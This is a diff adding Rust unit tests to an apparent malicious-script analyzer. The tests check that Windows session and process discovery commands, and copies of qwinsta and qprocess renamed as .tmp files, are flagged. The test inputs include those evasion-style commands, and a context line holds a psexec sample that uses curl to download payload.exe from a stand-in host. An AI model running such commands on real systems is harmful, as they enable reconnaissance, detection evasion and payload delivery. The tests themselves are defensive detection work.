@@ -4054,6 +4054,73 @@ C:\Users\Public\hn.tmp
     }
 
     #[test]
+    fn terminal_services_discovery_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"query user
+qwinsta
+qprocess *
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, command) in [
+            ("query-user", "query user"),
+            ("query-session", "qwinsta"),
+            ("query-process", "qprocess *"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing terminal-services enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_terminal_services_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\qwinsta.exe C:\Users\Public\qw.tmp
+C:\Users\Public\qw.tmp
+copy C:\Windows\System32\qprocess.exe C:\Users\Public\qp.tmp
+C:\Users\Public\qp.tmp *
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r#"C:\Users\Public\qw.tmp"#, r#"C:\Users\Public\qp.tmp"#] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied terminal-services alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "query-session" && command == "qwinsta.exe"
+            )),
+            "copied qwinsta enumeration was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "query-process" && command == "qprocess.exe *"
+            )),
+            "copied qprocess enumeration was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
